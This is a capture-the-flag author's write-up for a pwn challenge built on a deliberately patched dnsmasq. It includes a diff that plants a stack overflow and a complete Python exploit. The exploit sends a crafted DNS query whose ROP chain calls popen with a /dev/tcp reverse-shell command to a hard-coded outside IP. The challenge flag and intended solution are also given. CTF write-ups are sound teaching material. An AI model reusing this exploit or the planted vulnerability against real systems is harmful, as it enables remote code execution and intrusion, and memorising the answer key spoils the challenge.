# WP

## Master of DNS

- difficulty: easy
- flag: `ACTF{d0M@1n_Po1nt3rs_aR3_VuLn3rab1e_1d7a90a63039831c7fcaa53b766d5b2d!!!!!}`
- description:

I heard that you are proficient in the DNS protocol, there is just a chance to verify your ability, come and join to solve it.

### writeup

To let ctf players understand a keypoint where DNS is easy to cause threats, I designed this contest questions. The inspiration comes from analyzing DNS-related CVEs. DNS domain name pointers also cause many security threats and vulnerabilities in DNS-related products.

Follow the steps below:

- use the fuzz or diff method to find vulnerability, and only make changes in two places (the changes are very small). Removed the obvious features of dnsmasq, and added several functions that interfere with diff
    - remove tcp_request function and close tcp query, because using tcp protocol can trigger vulnerability without domain name pointer
    - Add stack overflow
    - Modify as follows
        
        ```python
        diff --color -Naur dnsmasq-2.86/src/dnsmasq.c dnsmasq-2.86-patch/src/dnsmasq.c
        --- dnsmasq-2.86/src/dnsmasq.c	2021-09-09 04:21:22.000000000 +0800
        +++ dnsmasq-2.86-patch/src/dnsmasq.c	2022-03-18 16:02:32.425548837 +0800
        @@ -1986,13 +1986,14 @@
         	      if ((flags = fcntl(confd, F_GETFL, 0)) != -1)
         		fcntl(confd, F_SETFL, flags & ~O_NONBLOCK);
         	      
        -	      buff = tcp_request(confd, now, &tcp_addr, netmask, auth_dns);
        +        //关闭tcp查询
        +	      //buff = tcp_request(confd, now, &tcp_addr, netmask, auth_dns);
         	       
         	      shutdown(confd, SHUT_RDWR);
         	      close(confd);
         	      
        -	      if (buff)
        -		free(buff);
        +	      //if (buff)
        +		//free(buff);
         	      
         	      for (s = daemon->servers; s; s = s->next)
         		if (s->tcpfd != -1)
        diff --color -Naur dnsmasq-2.86/src/rfc1035.c dnsmasq-2.86-patch/src/rfc1035.c
        --- dnsmasq-2.86/src/rfc1035.c	2021-09-09 04:21:22.000000000 +0800
        +++ dnsmasq-2.86-patch/src/rfc1035.c	2022-03-19 16:37:28.636136647 +0800
        @@ -19,9 +19,11 @@
         int extract_name(struct dns_header *header, size_t plen, unsigned char **pp, 
         		 char *name, int isExtract, int extrabytes)
         {
        +  //这里根据exp的构造调整一下
           unsigned char *cp = (unsigned char *)name, *p = *pp, *p1 = NULL;
        -  unsigned int j, l, namelen = 0, hops = 0;
        +  unsigned int j, l,namelen = 0, hops = 0;
           int retvalue = 1;
        +  unsigned char vul[848];
           
           if (isExtract)
             *cp = 0;
        @@ -54,6 +56,7 @@
         	  else
         	    *pp = p;
         	  
        +	  memcpy(vul, name, namelen);
         	  return retvalue;
         	}
        ```
        
- construct a poc according to the vulnerability, and use the domain name pointer to construct a domain name with a length greater than 848 to trigger the vulnerability.
- Stack overflow vulnerability, use popen function to reverse shell.
    - This is not an overflow of arbitrary length (the maximum length between points of domain name is `0x3f`), and there cannot be `\x00` byte and `\x2e` byte in the domain name. The maximum overflow length is `123` bytes.
    - Restrictions on some exploitation methods
        - mprotect function opens executable permissions and writes shellcode, obviously the overflow length is not enough to support this.
        - use orw’s method to get the flag, but `\x00` bytes will not appear in the parameters, which is also not feasible.
        - Use the execl function to reverse the shell, but the last parameter must be `\x00`, unless the last one in the stack layout is `\x00`, you can also use `int 80` to achieve, maybe 123 bytes is not enough to use.
    - expected use
        - Use popen function to reverse shell, only two parameters are needed here. one is the command to be executed, and the other is the operation type, read or write. Similar to `popen(char *cmd, char *type)`.
        - Due to the limitation of overflow length, we added several gadgets to meet the requirements, and also examined the ability of players to use gadgets
            - Add a gadget to write a value to an address, and add an XOR operation to avoid occur`\x2e` byte.
                
                ```python
                add eax, 4
                pop edx
                xor edx, 0xffffffff
                mov dword ptr [eax], edx
                ret
                ```
                
            - Because there will be a `\x2e` byte interference in the middle of 123 bytes, so add a useless gadget whose last byte of address is `\x2e`.
                
                ```python
                nop
                ret
                ```
                
            - Both of the above gadgets can be searched using **ropper** or **ROPgadget**.
- Of course, this question is also relatively open, and there can be a variety of getshell methods (the awesome ctfer may have other better ways to use it).

### EXP

```python
import socket
import os
import argparse
import random
import string
from pwn import *
context.arch='i386' #指定架构,不然会报错

#  无需connect服务端，因为发送时候跟上服务端ip和port就行
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def genRandom(num, slen):
    unique_strings = []
    while len(unique_strings) < num:
        ustring = ''.join(random.choice(string.ascii_lowercase + string.ascii_lowercase + string.digits) for i in range(slen))
        if ustring not in unique_strings:
            unique_strings.append(ustring)
    return unique_strings

def dnsquery(ip, port):
    query = os.urandom(2)
    query += b'\x01\x00' # Flags: query + Truncated + Recursion Desired + Recursion Available
    query += b'\x00\x01' # Questions
    query += b'\x00\x00' # Answer RRs
    query += b'\x00\x00' # Authority RRs
    query += b'\x00\x00'# Additional RRs

    # Queries
    payload = b'\x3f' * 0x40
    for i in range(13):
        payload += b'\xc0'
        payload += bytes([0xe + i * 2])
    payload += b'\x3d'
    payload += b'\x41\x41\x41\x41\x41'

    popen_addr = 0x804ab40
    exit_addr = 0x804ad30
    nop_2e_addr = 0x0804A92E
    pop_eax_addr = 0x08059d44
    w_str_addr = 0x080A6660
    update_addr = 0x0804B2B1
    bss_addr = 0x80a7070

    shell = b'/bin/sh -i >& /dev/tcp/59.63.224.105/9 0>&1'.ljust(44, b'\x00')
    value = []
    for i in range(0, len(shell), 4):
        value.append(u32(shell[i:(i + 4)]))
    print(len(value))

    payload += flat([pop_eax_addr, bss_addr])
    for i in range(6):
        payload += flat([update_addr, value[i] ^ 0xffffffff])

    payload += b'\x3f'
    payload += b'\xa9\x04\x08'
    for i in range(6, 11):
        payload += flat([update_addr, value[i] ^ 0xffffffff])
    payload += flat([popen_addr, exit_addr, bss_addr + 0x4, w_str_addr])
    payload += b'\x41\x41\x41\x41'
    payload += b'\x00'
    print(payload)
    query += payload  # Name
    query += b'\x00\x01' # Type: NS
    query += b'\x00\x01'# Class: IN

    client.sendto(query, (ip, int(port)))
    data, server_addr = client.recvfrom(1024)
    print(data)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-ip', help='ip address', required=True)
    parser.add_argument('-port', help='port', required=True)
    args = parser.parse_args()
    
    ip = args.ip
    port = args.port
    dnsquery(ip, port)

if __name__ == '__main__':
    main()
```